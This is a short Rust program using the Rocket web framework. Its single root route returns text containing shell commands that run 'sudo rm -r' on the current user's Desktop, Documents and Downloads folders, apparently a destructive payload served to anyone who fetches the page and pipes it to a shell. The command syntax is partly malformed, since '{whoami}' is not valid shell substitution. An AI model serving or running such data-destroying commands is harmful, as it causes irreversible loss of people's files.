#[macro_use] extern crate rocket;

#[get("/")]
fn index() -> &'static str {
    "
    user={whoami}
    sudo rm -r /Users/{user}/Desktop
    sudo rm -r /Users/{user}/Documents
    sudo rm -r /Users/{user}/Downloads
    "
}

#[launch]
fn rocket() -> _ {
    rocket::build().mount("/", routes![index])
}
